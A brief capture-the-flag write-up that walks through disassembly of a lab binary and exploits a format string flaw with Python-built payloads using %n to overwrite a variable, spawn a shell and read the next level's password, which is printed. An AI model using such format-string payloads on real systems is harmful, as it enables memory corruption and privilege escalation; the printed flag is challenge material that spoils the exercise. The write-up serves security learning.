# Call to `fgets` which is protected against buffer overflow
=> 0x80484c7 <v+35>:	call   0x80483a0 <fgets@plt>

# We can see a call to `printf` with whatever we enter previously as the string argument
   0x80484cc <v+40>:	lea    eax,[ebp-0x208]
   0x80484d2 <v+46>:	mov    DWORD PTR [esp],eax
=> 0x80484d5 <v+49>:	call   0x8048390 <printf@plt>

# A `cmp` is made with a uninitialize variable
=> 0x80484da <v+54>:	mov    eax,ds:0x804988c
   0x80484df <v+59>:	cmp    eax,0x40
# if this check succeed a new shell is created with `system("/bin/sh")`

# We will use the Format String Attack
# First we need to print the memory until we reach the address of the variable we wish to modify
$> python -c "print '\x8c\x98\x04\x08 %x %x %x %x'" > /tmp/payload3
$> cat /tmp/payload3 | ./level3
ï¿½ 200 b7fd1ac0 b7ff37d0 804988c

# Then we use the %n modifier to change the content of this variable
$> python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" > /tmp/payload3
$> cat /tmp/payload3 - | ./level3
> cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
